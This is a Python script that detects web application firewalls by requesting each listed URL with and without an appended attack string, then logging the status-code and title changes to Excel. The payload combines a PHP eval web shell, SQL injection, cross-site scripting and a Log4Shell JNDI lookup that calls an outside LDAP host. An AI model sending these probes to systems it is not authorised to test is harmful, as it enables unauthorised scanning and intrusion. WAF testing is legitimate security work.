import os
import sys
import requests
from openpyxl import Workbook
from openpyxl.styles import Border, Side, Font, Alignment
from openpyxl.utils import get_column_letter
from datetime import datetime
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

# 禁用不安全请求的警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def read_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()

def get_response_info(url,headers):
    try:
        response = requests.get(url, headers=headers, verify=False ,timeout=5)
        soup = BeautifulSoup(response.content, 'html.parser')
        title = soup.title.string.strip() if soup.title and soup.title.string else "无标题"
        status_code = response.status_code
        return title, status_code
    except requests.exceptions.Timeout:
        return "请求超时", 1
    except requests.exceptions.ConnectionError:
        return "连接被拒绝", 0


def check_waf(url, payloads, headers=None):
    results = []
    for payload in payloads:
        target_url = url + payload
        result = {}
        result['URL'] = url
        result['Payload'] = target_url
        # print(target_url)
        print('=======================================')
        print(url)
        print('----------------不含poc----------------')
        before_title, before_code = get_response_info(url, headers)
        after_title, after_code = get_response_info(target_url, headers)
        print(before_code,before_title)
        print('----------------含poc------------------')
        print(after_code,after_title)
        print('--------------检测结果-----------------')
        result['after_code'] = after_code
        result['before_code'] = before_code
        result['after_title'] = after_title
        result['before_title'] = before_title
        # if((before_code == 200 and after_code == 403) or (before_code == 200 and after_code == 0) or (before_code != 200 and after_code == 0)):
        #     print('存在WAF')
        # elif((before_code == 200 and after_code != 200 or after_code != 403 or after_code != 0)):
        #     print(1)
        if(before_code == 200):
            if(after_code == 403 or after_code == 0 or after_code == 1):
                print('存在WAF')
                result['WAF_Status'] = '存在WAF'
            elif(after_code == 200 and before_title == after_title):
                print('不存在WAF')
                result['WAF_Status'] = '不存在WAF'
            else:
                print('疑似存在WAF')
                result['WAF_Status'] = '疑似存在WAF'
        elif(before_code != 0):
            if(after_code == 0 or after_code == 1):
                print('存在WAF')
                result['WAF_Status'] = '存在WAF'
            elif((after_code != before_code) or (after_code == before_code and before_title != after_title)):
                print('疑似存在WAF')
                result['WAF_Status'] = '疑似存在WAF'
            elif(after_code == before_code and before_title == after_title):
                print('不存在WAF')
                result['WAF_Status'] = '不存在WAF'
            else:
                print('漏网之鱼')
                result['WAF_Status'] = '漏网之鱼'
        elif(before_code == 0):
            print('站点无法访问')
            # 被服务器拒绝。站点可能无法访问或者被安全设备封禁了
            result['WAF_Status'] = '站点无法访问'
        else:
            print('请求超时，网络异常')
            result['WAF_Status'] = '请求失败'
        results.append(result)
    return results

def get_filename_without_extension(file_path):
    base_name = os.path.basename(file_path)  # 获取路径的基本文件名
    file_name_without_extension, _ = os.path.splitext(base_name)  # 分割文件名和扩展名
    return file_name_without_extension

def set_border(sheet):
    # 设置框线
    border = Border(left=Side(style='thin'), right=Side(style='thin'),
                    top=Side(style='thin'), bottom=Side(style='thin'))
    for row in ws.iter_rows(min_row=1, max_row=ws.max_row, min_col=1, max_col=ws.max_column):
        for cell in row:
            cell.border = border

def set_columns(sheet):
    # 设置列宽为最适合的列宽
    for col in ws.columns:
        max_length = 0
        column = [cell for cell in col]
        for cell in column:
            try:
                if len(str(cell.value)) > max_length:
                    max_length = len(cell.value)
            except:
                pass
        adjusted_width = (max_length + 2)
        ws.column_dimensions[get_column_letter(col[0].column)].width = adjusted_width
url_file_path = 'urls.txt'
try:
    url_file_path = sys.argv[1]
    file_name = get_filename_without_extension(url_file_path)
except:
    print('请输入txt文件名，默认读取urls.txt')
    sys.exit()
urls = read_urls_from_file(url_file_path)
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
payloads = ["?a=<%3fphp+%40eval($_GET['cmd'])%3b%3f>&b=1'+or+'1'%3d'1&c=${jndi%3aldap%3a//10.0.0.1%3a8080/Exploit}&s=<script>alert(1)</script>&id=UNION+SELECT+ALL+FROM+information_schema+AND+'+or+SLEEP(5)+or+'"]  # 这里可以添加更多的payload
results = []
for url in urls:
    results.extend(check_waf(url, payloads, headers))

# 创建一个新的Excel工作簿
wb = Workbook()
# 获取当前活动的工作表
ws = wb.active

# 设置第一行为"URL"、"Payload"和"WAF_Status"，并应用字体和对齐样式
for i, title in enumerate(["URL", "before_code", "before_title", "after_code", "after_title", "WAF_Status"], start=1):
    cell = ws.cell(row=1, column=i, value=title)
    cell.font = Font(bold=True)
    cell.alignment = Alignment(horizontal='center', vertical='center')
# 将结果保存到Excel文件中
for i, result in enumerate(results, start=2):
    ws.cell(row=i, column=1, value=result['URL'])
    ws.cell(row=i, column=2, value=result['before_code'])
    ws.cell(row=i, column=3, value=result['before_title'])
    ws.cell(row=i, column=4, value=result['after_code'])
    ws.cell(row=i, column=5, value=result['after_title'])

    # ws.cell(row=i, column=3, value=result['WAF_Status'])
    if 'WAF_Status' in result:
        ws.cell(row=i, column=6, value=result['WAF_Status'])
    else:
        ws.cell(row=i, column=6, value='N/A')
    ws.cell(row=i, column=7, value=result['Payload'])

# 设置框线
set_border(ws)
# 设置列宽为最适合的列宽
set_columns(ws)

# 获取当前时间并格式化为字符串
current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
# 保存Excel文件
wb.save(f"{file_name}_waf_results_{current_time}.xlsx")
